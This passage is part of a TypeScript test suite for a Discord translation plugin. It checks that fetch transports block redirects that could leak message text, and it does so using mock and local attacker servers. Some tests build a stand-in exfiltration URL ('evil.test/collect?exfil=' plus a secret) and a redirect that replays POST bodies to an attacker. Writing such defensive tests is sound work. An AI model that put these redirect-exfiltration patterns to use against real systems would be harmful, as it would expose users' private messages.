            expect(text.includes('redirect: "follow"'), label).toBe(true);
        }
    });

    it("the predicate is named, not an inline host comparison scattered about", () => {
        // The exception has to be readable in one place. A transport that grew a
        // second, inline `=== "script.google.com"` test would be one where the scope
        // is no longer what FOLLOW_MODE_HOSTS says it is.
        for (const [label, path] of Object.entries(TRANSPORTS)) {
            const text = source(path);
            expect(text.includes("function usesFollowMode("), label).toBe(true);
            expect(text.includes("if (usesFollowMode(checked.href))"), label).toBe(true);
            expect(text.includes("function landedWithinFollowScope("), label).toBe(true);
            // The host string belongs in set literals only — ALLOWED_HOSTS,
            // FOLLOW_MODE_HOSTS, FOLLOW_LANDING_HOSTS — and must never appear as a
            // comparison. Comments are prose, so it is the compare FORM that is
            // searched for rather than the bare host name.
            expect(/[=!]==\s*"script\.google\.com"/.test(text), label).toBe(false);
        }
    });

    it("the residual risk is written down in every transport, not just one", () => {
        // A trade documented only in the file its author happened to be editing is a
        // trade the next reader does not know about. The wording is not pinned; the
        // presence of the two load-bearing facts is.
        for (const [label, path] of Object.entries(TRANSPORTS)) {
            const text = source(path);
            expect(text.includes("REPLAY THE POST BODY"), label).toBe(true);
            expect(text.includes("host_permissions"), label).toBe(true);
        }
    });
});

describe("the follow-mode exception, transport by transport", () => {
    let hostListener: (m: any, s: any, respond: (r: any) => void) => unknown;

    beforeEach(async () => {
        vi.resetModules();
        vi.stubGlobal("IS_EXTENSION", false);
        vi.stubGlobal("chrome", {
            runtime: { onMessage: { addListener: (l: any) => { hostListener = l; } } }
        });
        await import("../browser/translationHost.js");
    });

    afterEach(() => vi.unstubAllGlobals());

    async function ask(which: keyof typeof TRANSPORTS, url: string, init?: unknown): Promise<any> {
        if (which === "native.ts") {
            const { fetchTranslation } = await import("../src/plugins/channelTranslator/native");
            return fetchTranslation({} as any, url, init as any);
        }
        if (which === "translationHost.js") {
            return new Promise<any>(resolve => {
                hostListener({ action: "discordTranslator:fetch", url, init }, null, resolve);
            });
        }
        const { ChannelTranslatorHelper } = await import("../browser/translationBridge");
        return ChannelTranslatorHelper.fetchTranslation(url, init as any);
    }

    const NAMES = Object.keys(TRANSPORTS) as (keyof typeof TRANSPORTS)[];

    // -- which mode each transport asks for -----------------------------------

    for (const which of NAMES) {
        it(`${which} asks for redirect: "${APPS_SCRIPT_MODE[which]}" on a POST to script.google.com`, async () => {
            const fetchMock = vi.fn(async (u: string) => okResponse(u));
            vi.stubGlobal("fetch", fetchMock);

            await ask(which, APPS_SCRIPT_EXEC, { method: "POST", body: SECRET_BODY });

            expect(fetchMock.mock.calls[0][1]).toMatchObject({ redirect: APPS_SCRIPT_MODE[which] });
        });

        it(`${which} asks for redirect: "${APPS_SCRIPT_MODE[which]}" on a GET to script.google.com too`, async () => {
            const fetchMock = vi.fn(async (u: string) => okResponse(u));
            vi.stubGlobal("fetch", fetchMock);

            await ask(which, APPS_SCRIPT_EXEC);

            expect(fetchMock.mock.calls[0][1]).toMatchObject({ redirect: APPS_SCRIPT_MODE[which] });
        });

        it(`${which} still asks for redirect: "manual" on every OTHER allow-listed host`, async () => {
            // The scope test. If the predicate ever widened, this is what notices —
            // and it is asserted on the fetch OPTION, before any response exists, so
            // it cannot be satisfied by a refusal that happens afterwards.
            const fetchMock = vi.fn(async (u: string) => okResponse(u));
            vi.stubGlobal("fetch", fetchMock);

            for (const url of [ALLOWED, OUT_OF_SCOPE_ALLOWED, SECRET_GET_URL]) {
                fetchMock.mockClear();
                await ask(which, url, url === SECRET_GET_URL ? undefined : { method: "POST", body: SECRET_BODY });
                expect(fetchMock.mock.calls[0][1], url).toMatchObject({ redirect: "manual" });
            }
        });

        it(`${which} still refuses a 302 from every OTHER allow-listed host, and the target receives NOTHING`, async () => {
            // The other half of the scope test, on behaviour rather than on the
            // option: an allow-listed host that is not the Apps Script one takes the
            // manual branch, so an opaque-redirect runtime refuses it outright.
            const hops: Hop[] = [];
            vi.stubGlobal("fetch", chainFetch(
                { [OUT_OF_SCOPE_ALLOWED]: { status: 302, location: ATTACKER } }, hops, "browser"));

            const res = await ask(which, OUT_OF_SCOPE_ALLOWED, { method: "POST", body: SECRET_BODY });

            expect(hops.map(h => h.url), "the attacker origin must receive NOTHING")
                .toEqual([OUT_OF_SCOPE_ALLOWED]);
            expect(res.status).toBe(0);
            expect(res.body).toBe(`blocked: ${REDIRECT_OPAQUE_REFUSAL}`);
        });
    }

    // -- the follow branch, in the two transports that take it ----------------

    for (const which of FOLLOWERS) {
        it(`${which} follows the Apps Script 302 and returns the translation`, async () => {
            // The product claim. This is the case that could not succeed before:
            // /exec answers 302, the runtime follows it, and the JSON comes back.
            const hops: Hop[] = [];
            vi.stubGlobal("fetch", chainFetch(
                { [APPS_SCRIPT_EXEC]: { status: 302, location: APPS_SCRIPT_RESULT } }, hops));

            const res = await ask(which, APPS_SCRIPT_EXEC, { method: "POST", body: SECRET_BODY });

            expect(res.status).toBe(200);
            expect(res.body).toBe("ok");
            // Two hops, and the second is a bodiless GET — the runtime's own 302
            // handling, asserted rather than assumed.
            expect(hops.map(h => h.url)).toEqual([APPS_SCRIPT_EXEC, APPS_SCRIPT_RESULT]);
            expect(hops[1].method).toBe("GET");
            expect(hops[1].body, "the message text must not reach the result host").toBeUndefined();
            expect(JSON.stringify(hops[1])).not.toContain(SECRET);
        });

        it(`${which} accepts a follow-mode response that landed on script.googleusercontent.com`, async () => {
            vi.stubGlobal("fetch", vi.fn(async () => okResponse(APPS_SCRIPT_RESULT)));

            const res = await ask(which, APPS_SCRIPT_EXEC, { method: "POST", body: SECRET_BODY });

            expect(res.status).toBe(200);
            expect(res.body).toBe("ok");
        });

        it(`${which} accepts a deployment that answered directly, without redirecting`, async () => {
            // script.google.com is in the landing set as well as the result host. A
            // Web App that answers 200 in place is a normal response and must not be
            // refused for staying put.
            vi.stubGlobal("fetch", vi.fn(async () => okResponse(APPS_SCRIPT_EXEC)));

            const res = await ask(which, APPS_SCRIPT_EXEC, { method: "POST", body: SECRET_BODY });

            expect(res.status).toBe(200);
        });

        it(`${which} REFUSES a follow-mode response that landed on an allow-listed host outside the scope`, async () => {
            // THE TEST THE LANDING CHECK EXISTS FOR. api.deepl.com is a host these
            // transports talk to every day, and it is still refused here, because
            // nothing in the Apps Script flow can legitimately end there. A landing
            // check that reused ALLOWED_HOSTS would accept this.
            vi.stubGlobal("fetch", vi.fn(async () => okResponse(OUT_OF_SCOPE_ALLOWED)));

            const res = await ask(which, APPS_SCRIPT_EXEC, { method: "POST", body: SECRET_BODY });

            expect(res.status).toBe(0);
            expect(res.body).toBe(`blocked: ${FOLLOW_LANDING_REFUSAL}`);
        });

        it(`${which} REFUSES a follow-mode response that landed off the allow-list entirely`, async () => {
            vi.stubGlobal("fetch", vi.fn(async () => okResponse(ATTACKER)));

            const res = await ask(which, APPS_SCRIPT_EXEC, { method: "POST", body: SECRET_BODY });

            expect(res.status).toBe(0);
            expect(res.body).toBe(`blocked: ${FOLLOW_LANDING_REFUSAL}`);
        });

        it(`${which} REFUSES a follow-mode response that will not say where it landed`, async () => {
            // Fail closed. A response whose origin cannot be established is exactly
            // the case this check exists for, and it is the only check left once the
            // hop is invisible.
            vi.stubGlobal("fetch", vi.fn(async () => ({
                status: 200,
                text: async () => "ok",
                headers: { get: () => null }
            })));

            const res = await ask(which, APPS_SCRIPT_EXEC, { method: "POST", body: SECRET_BODY });

            expect(res.status).toBe(0);
            expect(res.body).toBe(`blocked: ${FOLLOW_LANDING_REFUSAL}`);
        });

        it(`${which} REFUSES a follow-mode landing on the right host but the wrong port`, async () => {
            // The landing runs checkUrl() first, so every rule that check enforces
            // applies to it — port, protocol and credentials included, not merely the
            // hostname.
            vi.stubGlobal("fetch", vi.fn(async () =>
                okResponse("https://script.googleusercontent.com:8080/macros/echo")));

            const res = await ask(which, APPS_SCRIPT_EXEC, { method: "POST", body: SECRET_BODY });

            expect(res.status).toBe(0);
            expect(res.body).toBe(`blocked: ${FOLLOW_LANDING_REFUSAL}`);
        });

        it(`${which} REFUSES a follow-mode landing that carries credentials`, async () => {
            vi.stubGlobal("fetch", vi.fn(async () =>
                okResponse("https://user:pass@script.googleusercontent.com/macros/echo")));

            const res = await ask(which, APPS_SCRIPT_EXEC, { method: "POST", body: SECRET_BODY });

            expect(res.status).toBe(0);
            expect(res.body).toBe(`blocked: ${FOLLOW_LANDING_REFUSAL}`);
            expect(res.body).not.toContain("pass");
        });

        it(`${which} never echoes the landing URL back into the page`, async () => {
            // The landing URL is third-party text, and the refusal is returned to the
            // page and written to the console. The pieces an attacker would choose —
            // host, path, query key, and the secret they hid in it — are each checked,
            // because "does not contain the whole URL" is satisfied by a message that
            // leaks half of it.
            const NASTY = "https://evil.test/collect?exfil=" + encodeURIComponent(SECRET);
            vi.stubGlobal("fetch", vi.fn(async () => okResponse(NASTY)));

            const res = await ask(which, APPS_SCRIPT_EXEC, { method: "POST", body: SECRET_BODY });

            expect(res.body).toBe(`blocked: ${FOLLOW_LANDING_REFUSAL}`);
            expect(res.body).not.toContain(NASTY);
            expect(res.body).not.toContain("evil.test");
            expect(res.body).not.toContain("collect");
            expect(res.body).not.toContain("exfil");
            expect(res.body).not.toContain(SECRET);
        });

        it(`${which} refuses a 3xx that survives follow mode rather than reading it as an answer`, async () => {
            // Belt and braces for a runtime that neither followed the redirect nor
            // was asked to describe one. Nothing here can reason about that, so it
            // fails closed instead of handing an empty body to the page as though the
            // provider had replied.
            vi.stubGlobal("fetch", vi.fn(async () => ({
                url: APPS_SCRIPT_EXEC,
                status: 307,
                type: "default",
                text: async () => "",
                headers: { get: () => null }
            })));

            const res = await ask(which, APPS_SCRIPT_EXEC, { method: "POST", body: SECRET_BODY });

            expect(res.status).toBe(0);
            expect(res.body).toBe(`blocked: ${REDIRECT_REPLAY_REFUSAL}`);
        });
    }

    it("translationBridge.ts reads GM_fetch's finalUrl for the follow-mode landing too", async () => {
        // The userscript path. GMPolyfill resolves the raw GM_xmlhttpRequest
        // response, which has no `url` at all — a landing check that only knew `url`
        // would refuse every Apps Script translation on that build, which is the
        // build where the manager was already following the redirect anyway.
        vi.stubGlobal("fetch", vi.fn(async () => ({
            status: 200,
            finalUrl: APPS_SCRIPT_RESULT,
            text: async () => "ok",
            headers: { get: () => null }
        })));

        const res = await ask("translationBridge.ts", APPS_SCRIPT_EXEC, { method: "POST", body: SECRET_BODY });

        expect(res.status).toBe(200);
        expect(res.body).toBe("ok");
    });

    it("translationBridge.ts refuses when GM_fetch's finalUrl is where it went wrong", async () => {
        vi.stubGlobal("fetch", vi.fn(async () => ({
            status: 200,
            finalUrl: ATTACKER,
            text: async () => "ok",
            headers: { get: () => null }
        })));

        const res = await ask("translationBridge.ts", APPS_SCRIPT_EXEC, { method: "POST", body: SECRET_BODY });

        expect(res.status).toBe(0);
        expect(res.body).toBe(`blocked: ${FOLLOW_LANDING_REFUSAL}`);
    });

    // -- the desktop keeps the stronger path ----------------------------------

    it("native.ts still INSPECTS the Apps Script 302 rather than following it blind", async () => {
        // The desktop runtime hands back the real 302 with its Location, so it keeps
        // the path that validates the target BEFORE anything is sent onward: two
        // hops, the second a bodiless GET, and both fetches still manual.
        const hops: Hop[] = [];
        const fetchMock = chainFetch(
            { [APPS_SCRIPT_EXEC]: { status: 302, location: APPS_SCRIPT_RESULT } }, hops);
        vi.stubGlobal("fetch", fetchMock);

        const res = await ask("native.ts", APPS_SCRIPT_EXEC, { method: "POST", body: SECRET_BODY });

        expect(res.status).toBe(200);
        expect(hops.map(h => h.url)).toEqual([APPS_SCRIPT_EXEC, APPS_SCRIPT_RESULT]);
        expect(hops[1].method).toBe("GET");
        expect(hops[1].body).toBeUndefined();
        expect(fetchMock.mock.calls[0][1]).toMatchObject({ redirect: "manual" });
        expect(fetchMock.mock.calls[1][1]).toMatchObject({ redirect: "manual" });
    });

    it("native.ts refuses a 307 from script.google.com, and the attacker receives NOTHING", async () => {
        // The protection the desktop keeps and the browser builds give up. Stated as
        // a test rather than as prose, because it is the exact difference between the
        // two branches.
        const hops: Hop[] = [];
        vi.stubGlobal("fetch", chainFetch(
            { [APPS_SCRIPT_EXEC]: { status: 307, location: ATTACKER } }, hops));

        const res = await ask("native.ts", APPS_SCRIPT_EXEC, { method: "POST", body: SECRET_BODY });

        expect(hops.map(h => h.url), "the attacker origin must receive NOTHING").toEqual([APPS_SCRIPT_EXEC]);
        expect(res.body).toBe(`blocked: ${REDIRECT_REPLAY_REFUSAL}`);
        expect(res.body).not.toContain(SECRET);
    });

    // -- the residual, written down as a test that watches it happen ----------

    for (const which of FOLLOWERS) {
        it(`${which} — a 307 from script.google.com DOES replay the body in follow mode (residual, documented)`, async () => {
            // NOT a passing grade. This is the exposure the exception buys, kept as a
            // test so that it cannot be quietly re-described as protection later.
            //
            // In follow mode the hop is invisible, so a 307 is replayed by the runtime
            // with method and body intact before any code here runs. All the transport
            // can then do is refuse the RESPONSE — which is exactly what the old
            // post-hoc redirect guard did while claiming more.
            //
            // What bounds it: script.google.com is already the intended recipient of
            // that body, so this is a host that HOLDS the plaintext bouncing it
            // onward, not a new disclosure. What does not bound it: anything in this
            // repo. In the extension build Chrome refuses a redirect outside
            // host_permissions, which is Chrome's control and not ours.
            const hops: Hop[] = [];
            vi.stubGlobal("fetch", chainFetch(
                { [APPS_SCRIPT_EXEC]: { status: 307, location: ATTACKER } }, hops));

            const res = await ask(which, APPS_SCRIPT_EXEC, { method: "POST", body: SECRET_BODY });

            // The leak really did happen...
            expect(hops.map(h => h.url)).toEqual([APPS_SCRIPT_EXEC, ATTACKER]);
            expect(hops[1].method, "a 307 replays the METHOD").toBe("POST");
            expect(hops[1].body, "and the BODY — this is what follow mode gives up").toBe(SECRET_BODY);

            // ...and the only thing left is to withhold the response.
            expect(res.status).toBe(0);
            expect(res.body).toBe(`blocked: ${FOLLOW_LANDING_REFUSAL}`);
            expect(res.body).not.toContain(SECRET);
        });

        it(`${which} — a 302 from script.google.com to an attacker does NOT deliver the body (the contrast)`, async () => {
            // Same host, same request, one status apart. The body does not travel on a
            // 302, so what the attacker gets is a bodiless GET — and the response is
            // refused anyway because the landing is out of scope. Without this the
            // test above could be read as "follow mode leaks", which is too strong: it
            // leaks on the status that replays, and on that status alone.
            const hops: Hop[] = [];
            vi.stubGlobal("fetch", chainFetch(
                { [APPS_SCRIPT_EXEC]: { status: 302, location: ATTACKER } }, hops));

            const res = await ask(which, APPS_SCRIPT_EXEC, { method: "POST", body: SECRET_BODY });

            expect(hops.map(h => h.url)).toEqual([APPS_SCRIPT_EXEC, ATTACKER]);
            expect(hops[1].method).toBe("GET");
            expect(hops[1].body, "the message text does NOT reach the attacker").toBeUndefined();
            expect(res.status).toBe(0);
            expect(res.body).toBe(`blocked: ${FOLLOW_LANDING_REFUSAL}`);
        });
    }
});

// ---------------------------------------------------------------------------
// The mechanism itself, over a real socket. No mocks.
// ---------------------------------------------------------------------------

/*
 * Everything above this line is a mock agreeing with a mock. This block is the
 * one that establishes the premise the whole fix rests on — that the default
 * redirect mode really does hand the body to the redirect target, and that
 * "manual" really does not — using the runtime's own fetch against two real HTTP
 * servers, one playing the allowed provider and one playing the attacker.
 *
 * It is the reproduction the fix was written against, kept as a test so that a
 * future runtime change cannot silently invalidate the reasoning.
 *
 * The transports themselves cannot be pointed at these servers: they are
 * http://127.0.0.1, and checkUrl() refuses anything that is not https on an
 * allow-listed hostname. That refusal is the subject of other tests; this one is
 * about the redirect primitive underneath.
 */

/** Captured before any vi.stubGlobal in this file can replace it. */
const realFetch = globalThis.fetch;

describe("the redirect primitive, over real sockets (control for the whole fix)", () => {
    const received: { url: string; body: string; }[] = [];
    let allowed: import("http").Server;
    let attacker: import("http").Server;
    let allowedOrigin = "";

    function listen(server: import("http").Server): Promise<number> {
        return new Promise(resolve => {
            server.listen(0, "127.0.0.1", () => {
                resolve((server.address() as import("net").AddressInfo).port);
            });
        });
    }

    beforeAll(async () => {
        const { createServer } = await import("http");

        attacker = createServer((req, res) => {
            let body = "";
            req.on("data", chunk => { body += chunk; });
            req.on("end", () => {
                received.push({ url: req.url ?? "", body });
                res.writeHead(200, { "content-type": "text/plain" });
                res.end("collected");
            });
        });
        const attackerPort = await listen(attacker);

        allowed = createServer((req, res) => {
            // 307 rather than 302 on purpose: it is the one that preserves the
            // method AND replays the body.
            //
            // The original query is copied onto the Location. That is not something
            // HTTP does by itself — a redirect goes to the Location verbatim and does
            // NOT append the original query string — it is something the REDIRECTING
            // host chooses to do, and it can, because it already received the query.
            // Modelled here because that is the GET-side leak: the allow-list is
            // laundered in one hop by a host that is on it.
            const query = (req.url ?? "").includes("?") ? "?" + (req.url ?? "").split("?")[1] : "";
            res.writeHead(307, { location: `http://127.0.0.1:${attackerPort}/collect${query}` });
            res.end();
        });
        allowedOrigin = `http://127.0.0.1:${await listen(allowed)}`;
    });

    afterAll(async () => {
        await new Promise(r => attacker.close(r));
        await new Promise(r => allowed.close(r));
    });

    beforeEach(() => { received.length = 0; });

    it("the DEFAULT redirect mode hands the POST body to the attacker (this is the defect)", async () => {
        const res = await realFetch(`${allowedOrigin}/translate`, {
            method: "POST",
            headers: { "content-type": "application/json" },
            body: SECRET_BODY
        });
        await res.text();

        // Where it landed, read AFTER the fact — the check the old guard relied on.
        expect(new URL(res.url).port).not.toBe(new URL(allowedOrigin).port);
        // And by then the message was already gone. This is the whole finding.
        expect(received).toHaveLength(1);
        expect(received[0].body).toBe(SECRET_BODY);
        expect(received[0].body).toContain(SECRET);
    });

    it('redirect: "manual" delivers nothing to the attacker', async () => {
        const res = await realFetch(`${allowedOrigin}/translate`, {
            method: "POST",
            headers: { "content-type": "application/json" },
            body: SECRET_BODY,
            redirect: "manual"
        });
        await res.text();

        expect(res.status).toBe(307);
        expect(received).toEqual([]);
    });

    it("the DEFAULT redirect mode carries a GET to the attacker, message text and all", async () => {
        // The half a POST-only reading of this bug misses. For the free gtx provider
        // there is no body at all — core/providers/google.ts puts the message in the
        // query string — so "only POSTs replay their payload" would be a reason to
        // leave the GET on the default mode, and it would be wrong.
        //
        // Be exact about the mechanism, because the sloppy version of this claim is
        // false: HTTP does not append the original query to the Location. The
        // redirecting host does, above, and it can because it already holds the
        // query. What the redirect buys the attacker is not knowledge the provider
        // lacked — it is a request arriving at an origin the allow-list forbids,
        // carrying the message, with the browser's own cooperation.
        const res = await realFetch(`${allowedOrigin}/translate?q=${encodeURIComponent(SECRET)}`);
        await res.text();

        expect(received).toHaveLength(1);
        expect(decodeURIComponent(received[0].url)).toContain(SECRET);
    });

    it('redirect: "manual" does not carry the GET onward either', async () => {
        const res = await realFetch(
            `${allowedOrigin}/translate?q=${encodeURIComponent(SECRET)}`,
            { redirect: "manual" }
        );
        await res.text();

        expect(res.status).toBe(307);
        expect(received).toEqual([]);
    });

    it("the attacker server can actually record a request (positive control)", async () => {
        // Without this, all three "received nothing" assertions above would pass if
        // the server were simply broken or never listening.
        const location = allowed.listening ? null : "unreachable";
        expect(location).toBeNull();

        const res = await realFetch(`${allowedOrigin}/translate`, { method: "POST", body: "probe" });
        await res.text();
        expect(received).toHaveLength(1);
        expect(received[0].body).toBe("probe");
    });
});

/*
 * The OTHER half of the premise, also over real sockets: that a 302 is materially
 * different from a 307.
 *
 * The block above proves a 307 replays the body. This one proves the two facts the
 * followed-302 branch rests on, using the runtime's own fetch rather than a mock
 * that was written to agree with the code:
 *
 *   1. a 302 reissues as a GET and the body does NOT arrive at the target, so
 *      following one is not the exfiltration a 307 is; and
 *   2. `redirect: "manual"` hands back the real 302 WITH a readable Location on
 *      this runtime, which is the only reason the status branch can exist at all.
 *
 * Fact 2 is runtime-specific and that is exactly why it is measured rather than
 * assumed: the Fetch standard answers "manual" with an opaque-redirect response
 * carrying neither, which is why the extension and plain-web builds cannot do
 * this. If a future Electron main process moved off undici, this test is what
 * would notice.
 */
describe("a 302 does not replay the body, over real sockets (control for the follow branch)", () => {
    const received: { url: string; method: string; body: string; contentType: string; }[] = [];
    let redirector: import("http").Server;
    let result: import("http").Server;
    let redirectorOrigin = "";
    let resultOrigin = "";
    /** Flipped per test, so one pair of servers serves both statuses. */
    let status = 302;

    function listen(server: import("http").Server): Promise<number> {
        return new Promise(resolve => {
            server.listen(0, "127.0.0.1", () => {
                resolve((server.address() as import("net").AddressInfo).port);
            });
        });
    }

    beforeAll(async () => {
        const { createServer } = await import("http");

        result = createServer((req, res) => {
            let body = "";
            req.on("data", chunk => { body += chunk; });
            req.on("end", () => {
                received.push({
                    url: req.url ?? "",
                    method: req.method ?? "",
                    body,
                    contentType: String(req.headers["content-type"] ?? "")
                });
                res.writeHead(200, { "content-type": "application/json" });
                res.end('{"translations":["ok"]}');
            });
        });
        resultOrigin = `http://127.0.0.1:${await listen(result)}`;

        redirector = createServer((req, res) => {
            // The shape a real Apps Script /exec answers with: one redirect to the
            // host that actually serves the result.
            res.writeHead(status, { location: `${resultOrigin}/macros/echo` });
            res.end();
        });
        redirectorOrigin = `http://127.0.0.1:${await listen(redirector)}`;
    });

    afterAll(async () => {
        await new Promise(r => redirector.close(r));
        await new Promise(r => result.close(r));
    });

    beforeEach(() => { received.length = 0; status = 302; });

    it("a FOLLOWED 302 arrives at the target as a GET with no body", async () => {
        // This is the fact the whole distinction rests on, and it is measured here
        // rather than asserted in prose: the POST body does not travel.
        const res = await realFetch(`${redirectorOrigin}/exec`, {
            method: "POST",
            headers: { "content-type": "application/json" },
            body: SECRET_BODY
        });
        await res.text();

        expect(received).toHaveLength(1);
        expect(received[0].method, "the method is downgraded to GET").toBe("GET");
        expect(received[0].body, "and the body does not travel").toBe("");
        expect(received[0].body).not.toContain(SECRET);
    });

    it('an EXPLICIT redirect: "follow" POST arrives as a GET with an EMPTY body, and the landing is readable', async () => {
        // THE CLAIM THE WHOLE FOLLOW-MODE EXCEPTION RESTS ON, measured in this repo
        // over two real sockets rather than cited from a chair's transcript.
        //
        // The test above uses the DEFAULT mode; this one passes the option the
        // browser transports actually pass, because "the default behaves like this"
        // and "the option we send behaves like this" are two different claims and
        // only the second one is the code under test.
        //
        // The last assertion is the other half: the landing URL is observable, which
        // is the only thing landedWithinFollowScope() has left to work with once the
        // hop itself is invisible. If a runtime ever stopped reporting it, the
        // transports would refuse every follow-mode response — fail-closed, and this
        // is what would notice.
        const res = await realFetch(`${redirectorOrigin}/exec`, {
            method: "POST",
            headers: { "content-type": "application/json" },
            body: SECRET_BODY,
            redirect: "follow"
        });
        await res.text();

        expect(received).toHaveLength(1);
        expect(received[0].method, "the method is downgraded to GET").toBe("GET");
        expect(received[0].body, "AND THE BODY IS EMPTY — the message text does not travel").toBe("");
        expect(received[0].body).not.toContain(SECRET);
        expect(received[0].contentType, "no Content-Type is forwarded either").toBe("");

        // And where it ended up is exactly the second server, not the first.
        expect(new URL(res.url).port).toBe(new URL(resultOrigin).port);
        expect(new URL(res.url).port).not.toBe(new URL(redirectorOrigin).port);
    });

    it("a FOLLOWED 307 arrives at the same target WITH the body (the contrast)", async () => {
        // Same servers, same request, one status code apart. Without this the test
        // above could be passing because the server never sees bodies at all.
        status = 307;

        const res = await realFetch(`${redirectorOrigin}/exec`, {
            method: "POST",
            headers: { "content-type": "application/json" },
            body: SECRET_BODY
        });
        await res.text();

        expect(received).toHaveLength(1);
        expect(received[0].method).toBe("POST");
        expect(received[0].body).toBe(SECRET_BODY);
        expect(received[0].body).toContain(SECRET);
    });

    it('redirect: "manual" hands back the 302 AND a readable Location on this runtime', async () => {
        // The premise the desktop branch needs. On a runtime that answers with an
        // opaque-redirect response instead, status is 0 and this header is absent —
        // which is precisely why the extension build refuses rather than follows.
        const res = await realFetch(`${redirectorOrigin}/exec`, {
            method: "POST",
            headers: { "content-type": "application/json" },
            body: SECRET_BODY,
            redirect: "manual"
        });
        await res.text();

        expect(res.status).toBe(302);
        expect(res.headers.get("location")).toBe(`${resultOrigin}/macros/echo`);
        expect(received, "and nothing reached the target yet").toEqual([]);
    });

    it("the follow-up GET the transports issue delivers no body and no content type", async () => {
        // Exactly the second request the transports make: the Location, GET, no
        // body, no forwarded Content-Type, still manual.
        const first = await realFetch(`${redirectorOrigin}/exec`, {
            method: "POST",
            headers: { "content-type": "application/json" },
            body: SECRET_BODY,
            redirect: "manual"
        });
        await first.text();

        const second = await realFetch(first.headers.get("location")!, { redirect: "manual" });
        const body = await second.text();

        expect(second.status).toBe(200);
        expect(body).toBe('{"translations":["ok"]}');
        expect(received).toHaveLength(1);
        expect(received[0].method).toBe("GET");
        expect(received[0].body).toBe("");
        expect(received[0].contentType, "no Content-Type is forwarded").toBe("");
    });

    it("the result server records what it receives (positive control)", async () => {
        // Without this, every "the body did not travel" assertion above would pass
        // just as happily against a server that recorded nothing.
        const res = await realFetch(`${resultOrigin}/macros/echo`, {
            method: "POST",
            headers: { "content-type": "application/json" },
            body: SECRET_BODY
        });
        await res.text();

        expect(received).toHaveLength(1);
        expect(received[0].method).toBe("POST");
        expect(received[0].body).toBe(SECRET_BODY);
        expect(received[0].contentType).toBe("application/json");
    });
});
